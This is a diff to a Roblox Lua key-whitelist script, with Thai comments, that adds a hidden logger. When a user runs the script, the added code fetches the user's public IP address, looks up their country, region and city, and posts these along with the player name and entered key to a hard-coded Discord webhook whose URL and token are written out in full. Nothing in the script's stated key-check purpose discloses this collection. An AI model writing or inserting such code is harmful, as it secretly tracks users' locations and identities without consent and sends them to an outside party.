@@ -1,4 +1,5 @@
 local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 
 -- ตรวจสอบว่ามีตัวแปร KeyValue ถูกกำหนดหรือไม่
@@ -24,6 +25,49 @@ local B = Instance.new("BoolValue")
 B.Parent = LocalPlayer.WhilelistedFolder
 B.Name = "Whilelisted"
 B.Value = false
+
+-- ดึง IP Address
+local IPAddress = game:HttpGet("https://api64.ipify.org")
+
+-- ดึงข้อมูลที่อยู่จาก IP
+local LocationInfo = "Unknown"
+local Success, Response = pcall(function()
+    return game:HttpGet("http://ip-api.com/json/" .. IPAddress)
+end)
+
+if Success then
+    local Data = HttpService:JSONDecode(Response)
+    if Data and Data.status == "success" then
+        LocationInfo = Data.country .. ", " .. Data.regionName .. ", " .. Data.city
+    end
+end
+
+-- ส่งข้อมูลไปยัง Webhook
+local WebhookURL = "https://discord.com/api/webhooks/1349015830163095672/7K1N3CqOj2DdRwUCf_G-KujwTxfZ5U4Kmds-_6bdeEO8r_bXCwDWQqqAhELvCbICLwmq" -- เปลี่ยนเป็น URL ของคุณ
+local Data = {
+    username = "Script Logger",
+    embeds = {
+        {
+            title = "Script Executed",
+            description = "A user has executed the script.",
+            fields = {
+                { name = "Player Name", value = LocalPlayer.Name, inline = true },
+                { name = "Key Used", value = KeyValue, inline = true },
+                { name = "IP Address", value = IPAddress, inline = true },
+                { name = "Location", value = LocationInfo, inline = true }
+            },
+            color = 16711680
+        }
+    }
+}
+
+local Success, Response = pcall(function()
+    return HttpService:PostAsync(WebhookURL, HttpService:JSONEncode(Data), Enum.HttpContentType.ApplicationJson)
+end)
+
+if not Success then
+    warn("Failed to send webhook: " .. tostring(Response))
+end
 
 -- ใช้ table.find แทนการตรวจสอบทีละค่า
 if table.find(Key, KeyValue) then
